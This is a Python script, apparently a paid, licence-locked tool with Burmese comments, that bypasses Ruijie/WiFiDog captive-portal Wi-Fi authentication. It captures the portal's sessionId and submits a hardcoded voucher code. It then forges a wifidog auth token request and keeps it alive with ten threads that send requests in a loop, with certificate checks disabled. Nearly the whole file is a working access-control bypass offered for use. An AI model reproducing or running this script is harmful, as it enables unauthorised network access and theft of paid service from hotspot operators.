import requests, re, urllib3, time, threading, os, random, subprocess, sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

# SSL Bypass
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- [ CONFIGURATION ] ---
RAW_KEY_URL = "https://raw.githubusercontent.com/kokoarkar446-cloud/Starlink/refs/heads/main/key.txt"
LICENSE_FILE = "license.txt"
# Bypass Pulse Threads
THREAD_COUNT = 10

# --- SYSTEM COLORS ---
def col(c):
    codes = {"Y": "\033[93m", "G": "\033[92m", "R": "\033[91m", 
             "C": "\033[96m", "W": "\033[97m", "P": "\033[95m", "OFF": "\033[0m"}
    return codes.get(c, "\033[0m")

def get_hwid():
    try:
        return f"ID-{subprocess.check_output(['whoami']).decode().strip()}"
    except:
        return "ID-Unknown"

def banner(name="GUEST", exp="Checking...", days="--"):
    os.system('clear')
    print(col("Y") + " ="*38)
    # RUIJIE ASCII (ဝါ၊ စိမ်း၊ နီ)
    print(col("G") + "      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗")
    print(col("G") + "      ██╔══██╗██║   ██║██║     ██║██║██╔════╝")
    print(col("Y") + "      ██████╔╝██║   ██║██║     ██║██║█████╗  ")
    print(col("Y") + "      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  ")
    print(col("R") + "      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗")
    print(col("R") + "      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝")
    
    print(f" {col('R')}👑 MASTER: {name} {col('OFF')}| {col('Y')}ID: {get_hwid()}{col('OFF')}")
    print(f" {col('G')}📅 EXP: {exp} {col('OFF')}| {col('R')}⏳ REMAINING: {days} Days{col('OFF')}")
    print(col("Y") + " ="*6 + f" {col('R')}[{col('G')} RUJIE PREMIUM - HEAT-CONTROL ACTIVE {col('R')}] " + col("Y") + "="*7)
    print(col("OFF"))

def verify():
    hwid = get_hwid()
    # ရက်စွဲကိုပဲယူပြီး အချိန် (နာရီ/မိနစ်) ကို မယူတော့ပါ (ဒါမှ ရက်စွဲမပိုမှာပါ)
    now = datetime.now().date()

    # ၁။ Offline Auto Login
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                saved = f.read().strip().split(":")
            
            if len(saved) >= 3:
                v_name, v_exp = saved[1], saved[2]
                exp_date = datetime.strptime(v_exp, '%Y-%m-%d').date()
                
                # ရက်စွဲနှိုင်းယှဉ်ချက် (ဒီနေ့အပါအဝင်)
                diff = (exp_date - now).days
                
                if diff >= 0:
                    banner(v_name, v_exp, str(diff))
                    print(f"{col('G')}[✓] Offline Login Success!{col('OFF')}")
                    time.sleep(1)
                    return True
                else:
                    os.remove(LICENSE_FILE)
        except: pass

    # ၂။ Online Activation
    banner()
    try:
        print(f"{col('W')}[*] Connecting to License Server...{col('OFF')}")
        resp = requests.get(f"{RAW_KEY_URL}?t={random.random()}", timeout=15).text
        
        print(f"{col('W')}[+] YOUR DEVICE ID: {col('Y')}{hwid}{col('OFF')}")
        key = input(f"{col('Y')}[?] ENTER LICENSE KEY: {col('OFF')}").strip()

        for line in resp.splitlines():
            if ":" in line and f"{key}:{hwid}" in line:
                p = line.split(":")
                if len(p) >= 4:
                    v_name, v_exp = p[2], p[3]
                    exp_date = datetime.strptime(v_exp, '%Y-%m-%d').date()
                    diff = (exp_date - now).days
                    
                    if diff >= 0:
                        with open(LICENSE_FILE, "w") as f:
                            f.write(f"{key}:{v_name}:{v_exp}")
                        banner(v_name, v_exp, str(diff))
                        print(f"{col('G')}[✓] Access Granted!{col('OFF')}")
                        time.sleep(2)
                        return True
        
        print(f"{col('R')}[!] Invalid Key or ID Not Registered.{col('OFF')}")
        sys.exit()
    except Exception as e:
        print(f"{col('R')}[!] Server Error: {e}{col('OFF')}")
        sys.exit()

def check_net():
    try:
        return requests.get("http://www.google.com/generate_204", timeout=5).status_code == 204
    except:
        return False

def high_speed_pulse(link):
    session = requests.Session()
    while True:
        try:
            session.get(link, timeout=10, verify=False)
            print(f"{col('G')}[✓] Bypass Active | Pulse: [{random.randint(100,450)}ms]{col('OFF')}      ", end="\r")
            time.sleep(random.uniform(1.0, 2.5))
        except:
            break

def start_bypass():
    """Bypass Capture Logic (သင်အဆင်ပြေတယ်ဆိုတဲ့ ဒုတိယကုတ်အဟောင်းထဲက Logic)"""
    print(f"{col('C')}[*] Attempting to Capture Portal...{col('OFF')}")
    session = requests.Session()
    while True:
        try:
            if check_net():
                print(f"{col('Y')}[•] Internet Connected. Monitoring...{col('OFF')}         ", end="\r")
                time.sleep(10)
                continue
                
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            r1 = session.get(r.url, verify=False, timeout=5)
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(r.url, match.group(1)) if match else r.url
            r2 = session.get(n_url, verify=False, timeout=5)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                print(f"\n{col('G')}[✓] SID Captured: {sid[:15]}...{col('OFF')}")
                p_host = f"{urlparse(r.url).scheme}://{urlparse(r.url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", 
                             json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, 
                             timeout=10)
                
                gw = parse_qs(urlparse(r.url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(r.url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                
                print(f"{col('P')}[*] ⚡ Launching Stability Pulse Threads... ⚡{col('OFF')}")
                for _ in range(THREAD_COUNT):
                    threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
                
                while check_net():
                    time.sleep(5)
            else:
                print(f"{col('R')}[!] SID Not Found. Retrying in 5s...{col('OFF')}         ", end="\r")
                time.sleep(5)
        except:
            time.sleep(3)

if __name__ == "__main__":
    try:
        if verify():
            start_bypass()
    except KeyboardInterrupt:
        print(f"\n{col('R')}[!] Stopped by User.{col('OFF')}")
        os._exit(0)
